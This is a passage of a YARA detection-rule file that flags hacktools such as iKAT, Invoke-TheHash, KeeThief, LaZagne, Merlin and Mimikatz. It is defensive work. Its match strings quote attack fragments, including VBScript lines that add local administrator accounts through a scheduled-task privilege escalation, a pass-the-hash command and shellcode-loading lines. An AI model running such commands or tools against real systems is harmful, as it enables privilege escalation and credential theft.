FIELD,FILE,HTTP/ wide ascii\n        $password9 = /\\/scomma IE7setup\\.sys/ wide ascii\n        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii\n        $password11 = /\\/scomma office2007\\.cab/ wide ascii\n        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii\n        $password13 = /\\/scomma outlook2007\\.dll/ wide ascii\n        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii\n        $screenrec1 = /(s)111o00000000\\.dat/ wide ascii\n        $screenrec2 = /(t)111o00000000\\.dat/ wide ascii\n        $screenrec3 = /(f)113o00000000\\.dat/ wide ascii\n        $screenrec4 = /(w)114o00000000\\.dat/ wide ascii\n        $screenrec5 = /(u)112Q00000000\\.dat/ wide ascii\n        $screenrec6 = /(v)112Q00000000\\.dat/ wide ascii\n        $screenrec7 = /(v)112O00000000\\.dat/ wide ascii\n        $micrec = /2101[0-9A-F]{8}\\.dat/ wide ascii\n        $skyperec1 = /\\[%19s\\] %25s\\:    %s/ wide ascii\n        $skyperec2 = /Global\\\\\\{A48F1A32\\-A340\\-11D0\\-BC6B\\-00A0C903%\\.04X\\}/ wide\n        $driver = /\\\\\\\\\\\\\\\\\\.\\\\\\\\driverw/ wide ascii\n        $janedow1 = /(J)ane Dow\\'s x32 machine/ wide ascii\n        $janedow2 = /(J)ane Dow\\'s x64 machine/ wide ascii\n        $bootkit1 = /(b)ootkit_x32driver/\n        $bootkit2 = /(b)ootkit_x64driver/\n        $typo1 = /(S)creenShort Recording/ wide\n        $mssounddx = /(S)ystem\\\\CurrentControlSet\\\\Services\\\\mssounddx/ wide\n\n    condition:\n        (8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or $driver or any of ($janedow*) or any of ($bootkit*) or $typo1 or $mssounddx) and not any of ($filter*)\n}\n\nrule iKAT_wmi_rundll\n{\n    meta:\n        description = \"iKAT: interactive kiosk attack tool (file: wmi_rundll.exe)\"\n        ref = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n        classifications = \"Hacktool\"\n        threat_names = \"iKAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"iKAT_wmi_rundll\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"This operating system is not supported.\" fullword ascii\n        $s1 = \"Error!\" fullword ascii\n        $s2 = \"Win32 only!\" fullword ascii\n        $s3 = \"COMCTL32.dll\" fullword ascii\n        $s4 = \"[LordPE]\" ascii\n        $s5 = \"CRTDLL.dll\" fullword ascii\n        $s6 = \"VBScript\" fullword ascii\n        $s7 = \"CoUninitialize\" fullword ascii\n\n    condition:\n        all of them and filesize < 15KB\n}\n\nrule iKAT_revelations\n{\n    meta:\n        description = \"iKAT: interactive kiosk attack tool (file: revelations.exe)\"\n        ref = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n        classifications = \"Hacktool\"\n        threat_names = \"iKAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"iKAT_revelations\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"The RevelationHelper.DLL file is corrupt or missing.\" fullword ascii\n        $s8 = \"BETAsupport@snadboy.com\" fullword wide\n        $s9 = \"support@snadboy.com\" fullword wide\n        $s14 = \"RevelationHelper.dll\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule iKAT_priv_esc_tasksch\n{\n    meta:\n        description = \"iKAT: interactive kiosk attack tool (Task Schedulder local exploit)\"\n        ref = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n        classifications = \"Hacktool\"\n        threat_names = \"iKAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"iKAT_priv_esc_tasksch\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"objShell.Run \\\"schtasks /change /TN wDw00t /disable\\\",,True\" fullword ascii\n        $s3 = \"objShell.Run \\\"schtasks /run /TN wDw00t\\\",,True\" fullword ascii\n        $s4 = \"'objShell.Run \\\"cmd /c copy C:\\\\windows\\\\system32\\\\tasks\\\\wDw00t .\\\",,True\" fullword ascii\n        $s6 = \"a.WriteLine (\\\"schtasks /delete /f /TN wDw00t\\\")\" fullword ascii\n        $s7 = \"a.WriteLine (\\\"net user /add ikat ikat\\\")\" fullword ascii\n        $s8 = \"a.WriteLine (\\\"cmd.exe\\\")\" fullword ascii\n        $s9 = \"strFileName=\\\"C:\\\\windows\\\\system32\\\\tasks\\\\wDw00t\\\"\" fullword ascii\n        $s10 = \"For n = 1 To (Len (hexXML) - 1) step 2\" fullword ascii\n        $s13 = \"output.writeline \\\" Should work on Vista/Win7/2008 x86/x64\\\"\" fullword ascii\n        $s11 = \"Set objExecObject = objShell.Exec(\\\"cmd /c schtasks /query /XML /TN wDw00t\\\")\" fullword ascii\n        $s12 = \"objShell.Run \\\"schtasks /create /TN wDw00t /sc monthly /tr \\\"\\\"\\\"+biatchFile+\\\"\" ascii\n        $s14 = \"a.WriteLine (\\\"net localgroup administrators /add v4l\\\")\" fullword ascii\n        $s20 = \"Set ts = fso.createtextfile (\\\"wDw00t.xml\\\")\" fullword ascii\n\n    condition:\n        2 of them\n}\n\nrule iKAT_command_lines_agent\n{\n    meta:\n        description = \"iKAT: interactive kiosk attack tool (file: ikat.exe)\"\n        ref = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n        classifications = \"Hacktool\"\n        threat_names = \"iKAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"iKAT_command_lines_agent\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Extended Module: super mario brothers\" fullword ascii\n        $s1 = \"Extended Module: \" fullword ascii\n        $s3 = \"ofpurenostalgicfeeling\" fullword ascii\n        $s8 = \"-supermariobrotheretic\" fullword ascii\n        $s9 = \"!http://132.147.96.202:80\" fullword ascii\n        $s12 = \"iKAT Exe Template\" fullword ascii\n        $s15 = \"withadancyflavour..\" fullword ascii\n        $s16 = \"FastTracker v2.00   \" fullword ascii\n\n    condition:\n        4 of them\n}\n\nrule iKAT_cmd_as_dll\n{\n    meta:\n        description = \"iKAT: interactive kiosk attack tool (file: cmd.dll)\"\n        ref = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n        classifications = \"Hacktool\"\n        threat_names = \"iKAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"iKAT_cmd_as_dll\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd.exe\" fullword wide\n        $s2 = \"ReactOS Development Team\" fullword wide\n        $s3 = \"ReactOS Command Processor\" fullword wide\n        $ext = \"extension: .dll\" nocase\n\n    condition:\n        all of ($s*) and $ext\n}\n\nrule iKAT_startbar\n{\n    meta:\n        description = \"iKAT: interactive kiosk attack tool (file: startbar.exe)\"\n        ref = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n        classifications = \"Hacktool\"\n        threat_names = \"iKAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"iKAT_startbar\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Shinysoft Limited1\" fullword ascii\n        $s3 = \"Shinysoft Limited0\" fullword ascii\n        $s4 = \"Wellington1\" fullword ascii\n        $s6 = \"Wainuiomata1\" fullword ascii\n        $s8 = \"56 Wright St1\" fullword ascii\n        $s9 = \"UTN-USERFirst-Object\" fullword ascii\n        $s10 = \"New Zealand1\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule iKAT_Tool_Generic\n{\n    meta:\n        description = \"iKAT: interactive kiosk attack tool (files: gpdisable.exe, kitrap0d.exe, uacpoc.exe)\"\n        ref = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n        classifications = \"Hacktool\"\n        threat_names = \"iKAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"iKAT_Tool_Generic\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<IconFile>C:\\\\WINDOWS\\\\App.ico</IconFile>\" fullword\n        $s1 = \"Failed to read the entire file\" fullword\n        $s4 = \"<VersionCreatedBy>14.4.0</VersionCreatedBy>\" fullword\n        $s8 = \"<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P\"\n        $s9 = \"Running Zip pipeline...\" fullword\n        $s10 = \"<FinTitle />\" fullword\n        $s12 = \"<AutoTemp>0</AutoTemp>\" fullword\n        $s14 = \"<DefaultDir>%TEMP%</DefaultDir>\" fullword\n        $s15 = \"AES Encrypting...\" fullword\n        $s20 = \"<UnzipDir>%TEMP%</UnzipDir>\" fullword\n\n    condition:\n        all of them\n}\n\nrule Invoke_SMBExec\n{\n    meta:\n        description = \"Invoke-TheHash: PowerShell pass-the-hash utils (Invoke-SmbExec)\"\n        ref = \"https://github.com/Kevin-Robertson/Invoke-TheHash\"\n        classifications = \"Hacktool\"\n        threat_names = \"Invoke-TheHash\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Invoke_SMBExec\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Invoke-SMBExec -Target\" fullword ascii\n        $x2 = \"$packet_SMB_header = Get-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID\" fullword ascii\n        $s1 = \"Write-Output \\\"Command executed with service $SMB_service on $Target\\\"\" fullword ascii\n        $s2 = \"$packet_RPC_data = Get-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00\" fullword ascii\n        $s3 = \"$SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \\\\svcctl\" fullword ascii\n\n    condition:\n        (filesize < 400KB and 1 of them)\n}\n\nrule Invoke_WMIExec_Gen_1\n{\n    meta:\n        description = \"Invoke-TheHash: PowerShell pass-the-hash utils (Invoke-WmiExec)\"\n        ref = \"https://github.com/Kevin-Robertson/Invoke-TheHash\"\n        classifications = \"Hacktool\"\n        threat_names = \"Invoke-TheHash\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Invoke_WMIExec_Gen_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Invoke-WMIExec \" ascii\n        $x2 = \"$target_count = [System.math]::Pow(2,(($target_address.GetAddressBytes().Length * 8) - $subnet_mask_split))\" fullword ascii\n        $s1 = \"Import-Module $PWD\\\\Invoke-TheHash.ps1\" fullword ascii\n        $s2 = \"Import-Module $PWD\\\\Invoke-SMBClient.ps1\" fullword ascii\n        $s3 = \"$target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList\" fullword ascii\n        $x4 = \"Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0\" ascii\n\n    condition:\n        1 of them\n}\n\nrule KeeTheft_KeeThief_PS\n{\n    meta:\n        description = \"KeeTheft: KeePass dump tool (file: KeeThief.ps1)\"\n        ref = \"https://github.com/HarmJ0y/KeeThief\"\n        classifications = \"Hacktool\"\n        threat_names = \"KeeTheft\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KeeThief_PS\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"$WMIProcess = Get-WmiObject win32_process -Filter \\\"ProcessID = $($KeePassProcess.ID)\\\"\" fullword ascii\n        $x2 = \"if($KeePassProcess.FileVersion -match '^2\\\\.') {\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7223 and filesize < 1000KB and (1 of ($x*)))\n}\n\nrule KeeTheft_EXE\n{\n    meta:\n        description = \"KeeTheft: KeePass dump tool (file: KeeTheft.exe)\"\n        ref = \"https://github.com/HarmJ0y/KeeThief\"\n        classifications = \"Hacktool\"\n        threat_names = \"KeeTheft\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KeeTheft_EXE\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Error: Could not create a thread for the shellcode\" fullword wide\n        $x2 = \"Could not find address marker in shellcode\" fullword wide\n        $x3 = \"GenerateDecryptionShellCode\" fullword ascii\n        $x4 = \"KeePassLib.Keys.KcpPassword\" fullword wide\n        $x5 = \"************ Found a CompositeKey! **********\" fullword wide\n        $x6 = \"*** Interesting... there are multiple .NET runtimes loaded in KeePass\" fullword wide\n        $x7 = \"GetKcpPasswordInfo\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 2 of them)\n}\n\nrule KeeTheft_Out_Shellcode\n{\n    meta:\n        description = \"KeeTheft: KeePass dump tool (file: Out-Shellcode.ps1)\"\n        ref = \"https://github.com/HarmJ0y/KeeThief\"\n        classifications = \"Hacktool\"\n        threat_names = \"KeeTheft\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KeeTheft_Out_Shellcode\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Write-Host \\\"Shellcode length: 0x$(($ShellcodeLength + 1).ToString('X4'))\\\"\" fullword ascii\n        $x2 = \"$TextSectionInfo = @($MapContents | Where-Object { $_ -match '\\\\.text\\\\W+CODE' })[0]\" fullword ascii\n\n    condition:\n        (filesize < 2KB and 1 of them)\n}\n\nrule Kekeo_Hacktool\n{\n    meta:\n        description = \"Kekeo: toolbox for manipulating MS Kerberos\"\n        ref = \"https://github.com/gentilkiwi/kekeo/releases\"\n        classifications = \"Hacktool\"\n        threat_names = \"Kekeo\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Kekeo_Hacktool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"[ticket %u] session Key is NULL, maybe a TGT without enough rights when WCE dumped it.\" fullword wide\n        $x2 = \"ERROR kuhl_m_smb_time ; Invalid! Command: %02x - Status: %08x\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and (1 of ($x*)))\n}\n\nrule Lazagne_PW_Dumper\n{\n    meta:\n        description = \"Lazagne: password dumper\"\n        ref = \"https://github.com/AlessandroZ/LaZagne/releases/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Lazagne\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Markus Neis / Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Lazagne_PW_Dumper\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Crypto.Hash\" fullword ascii\n        $s2 = \"laZagne\" fullword ascii\n        $s3 = \"impacket.winregistry\" fullword ascii\n\n    condition:\n        3 of them\n}\n\nrule MASSCAN\n{\n    meta:\n        description = \"MASSCAN: mass IP port scanner\"\n        ref = \"https://github.com/robertdavidgraham/masscan\"\n        classifications = \"Hacktool\"\n        threat_names = \"Masscan\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_multi_masscan\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \"EHLO masscan\" fullword wide ascii\n        $a2 = \"User-Agent: masscan/\" wide ascii\n        $a3 = \"/etc/masscan/masscan.conf\" fullword wide ascii\n        $b1 = \"nmap(%s): unsupported. This code will never do DNS lookups.\" wide ascii\n        $b2 = \"nmap(%s): unsupported, we do timing WAY different than nmap\" wide ascii\n        $b3 = \"[hint] I've got some local priv escalation 0days that might work\" wide ascii\n        $b4 = \"[hint] VMware on Macintosh doesn't support masscan\" wide ascii\n\n    condition:\n        all of ($a*) or any of ($b*)\n}\n\nrule Merlin_Agent\n{\n    meta:\n        description = \"Merlin: cross-platform post-exploitation C&C server and agent\"\n        ref = \"https://github.com/Ne0nd0g/merlin\"\n        classifications = \"Hacktool\"\n        threat_names = \"Merlin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Hilko Bengen\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"merlinAgent\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Command output:\\x0d\\x0a\\x0d\\x0a%s\"\n        $x2 = \"[-]Connecting to web server at %s to update agent configuration information.\"\n        $x3 = \"[-]%d out of %d total failed checkins\"\n        $x4 = \"[!}Unknown AgentControl message type received %s\"\n        $x5 = \"[-]Received Agent Kill Message\"\n        $x6 = \"[-]Received Server OK, doing nothing\"\n        $x7 = \"[!]There was an error with the HTTP client while performing a POST:\"\n        $x8 = \"[-]Sleeping for %s at %s\"\n        $s1 = \"Executing command %s %s %s\"\n        $s2 = \"[+]Host Information:\"\n        $s3 = \"\\tHostname: %s\"\n        $s4 = \"\\tPlatform: %s\"\n        $s5 = \"\\tUser GUID: %s\"\n\n    condition:\n        1 of ($x*) or 4 of them\n}\n\nrule Invoke_Mimikatz\n{\n    meta:\n        description = \"Invoke-Mimikatz string\"\n        ref = \"https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Invoke_Mimikatz\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x2 = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm\" ascii\n        $x3 = \"Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule Mimikatz_kirbi_ticket\n{\n    meta:\n        description = \"KiRBi ticket for Mimikatz\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Benjamin DELPY (gentilkiwi); Didier Stevens\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"mimikatz_kirbi_ticket\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $asn1 = { 76 82 ?? ?? 30 82 ?? ?? a0 03 02 01 05 a1 03 02 01 16 }\n        $asn1_84 = { 76 84 ?? ?? ?? ?? 30 84 ?? ?? ?? ?? a0 84 00 00 00 03 02 01 05 a1 84 00 00 00 03 02 01 16 }\n\n    condition:\n        $asn1 at 0 or $asn1_84 at 0\n}\n\nrule Mimikatz_StegoKatz\n{\n    meta:\n        description = \"Encoded Mimikatz in other file types\"\n        ref = \"https://goo.gl/jWPBBY\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"StegoKatz\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"VC92Ny9TSXZMNk5jLy8vOUlqUTFVRlFNQTZMLysvdjlJaTh2L0ZUNXJBUUJJaTFRa1NFaUx6K2hWSS8vL1NJME44bklCQU9pZC92Ny9USTJjSkpBQUFBQXp3RW1MV3hCSmkyc1lTWXR6S0VtTDQxL0R6TXhNaTl4SmlWc0lUWWxMSUUySlF4aFZWbGRCVkVGVlFWWkJWMGlCN1BBQUFBQklnMlFrYUFDNE1BQUFBRW1MNkVTTmNPQ0pSQ1JnaVVRa1pFbU5RN0JKaTlsTWpRWFBGQU1BU0ls\" ascii\n        $s2 = \"Rpd3ovN3FlalVtNklLQ0xNNGtOV1BiY0VOVHROT0Zud25CWGN0WS9BcEdMR28rK01OWm85Nm9xMlNnY1U5aTgrSTBvNkFob1FOTzRHQWdtUElEVmlqald0Tk90b2FmN01ESWJUQkF5T0pYbTB4bFVHRTBZWEFWOXVoNHBkQnRrS0VFWWVBSEE2TDFzU0c5a2ZFTEc3QWd4WTBYY1l3ZzB6QUFXS09JZE9wQVhEK3lnS3lsR3B5Q1ljR1NJdFNseGZKWUlVVkNFdEZPVjRJUldERUl1QXpKZ2pCQWdsd0Va\" ascii\n\n    condition:\n        filesize < 1000KB and 1 of them\n}\n\nrule Mimikatz_sekurlsa\n{\n    meta:\n        description = \"Mimikatz: credential dump tool\"\n        ref = \"https://github.com/gentilkiwi/mimikatz\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_windows_mimikatz_sekurlsa\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"dpapisrv!g_MasterKeyCacheList\" fullword ascii wide\n        $s2 = \"lsasrv!g_MasterKeyCacheList\" fullword ascii wide\n        $s3 = \"!SspCredentialList\" ascii wide\n        $s4 = \"livessp!LiveGlobalLogonSessionList\" fullword ascii wide\n        $s5 = \"wdigest!l_LogSessList\" fullword ascii wide\n        $s6 = \"tspkg!TSGlobalCredTable\" fullword ascii wide\n\n    condition:\n        all of them\n}\n\nrule Mimikatz_modules\n{\n    meta:\n        description = \"Mimikatz: credential dump tool (modules)\"\n        ref = \"https://github.com/gentilkiwi/mimikatz\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_windows_mimikatz_modules\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"mimilib\" fullword ascii wide\n        $s2 = \"mimidrv\" fullword ascii wide\n        $s3 = \"mimilove\" fullword ascii wide\n\n    condition:\n        any of them\n}\n\nrule Mimikatz_files\n{\n    meta:\n        description = \"Mimikatz: credential dump tool (files)\"\n        ref = \"https://github.com/gentilkiwi/mimikatz\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_windows_mimikatz_files\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"kiwifilter.log\" fullword wide\n        $s2 = \"kiwissp.log\" fullword wide\n        $s3 = \"mimilib.dll\" fullword ascii wide\n\n    condition:\n        any of them\n}\n\nrule Mimikatz_errors\n{\n    meta:\n        description = \"Mimikatz: credential dump tool (error messages)\"\n        ref = \"https://github.com/gentilkiwi/mimikatz\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_windows_mimikatz_errors\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"[ERROR] [LSA] Symbols\" fullword ascii wide\n        $s2 = \"[ERROR] [CRYPTO] Acquire keys\" fullword ascii wide\n        $s3 = \"[ERROR] [CRYPTO] Symbols\" fullword ascii wide\n        $s4 = \"[ERROR] [CRYPTO] Init\" fullword ascii wide\n\n    condition:\n        all of them\n}\n\nrule Mimikatz_Sekurlsa_Module\n{\n    meta:\n        description = \"Mimikatz credentials extracting module\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        // available commands\n        $s1 = \"msv\" fullword wide ascii\n        $s2 = \"wdigest\" fullword wide ascii\n        $s3 = \"kerberos\" fullword wide ascii\n        $s4 = \"tspkg\" fullword wide ascii\n        $s5 = \"livessp\" fullword wide ascii\n        $s6 = \"ssp\" fullword wide ascii\n        $s7 = \"logonPasswords\" fullword wide ascii\n        $s8 = \"process\" fullword wide ascii\n        $s9 = \"minidump\" fullword wide ascii\n        $s10 = \"pth\" fullword wide ascii\n        $s11 = \"tickets\" fullword wide ascii\n        $s12 = \"ekeys\" fullword wide ascii\n        $s13 = \"dpapi\" fullword wide ascii\n        $s14 = \"credman\" fullword wide ascii\n        $s15 = \"krbtgt\" fullword wide ascii\n        $s16 = \"dpapisystem\" fullword wide ascii\n        // 64-bit additional commands ascii\n        $s17 = \"trust\" fullword wide ascii\n        $s18 = \"backupkeys\" fullword wide ascii\n\n        // module name\n        $m = \"sekurlsa\" fullword wide ascii\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 16 of ($s*)\n        and $m\n}\n\nrule Mimikatz_Memory_Rule_2\n{\n    meta:\n        description = \"Mimikatz: credential dump tool\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth - Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = 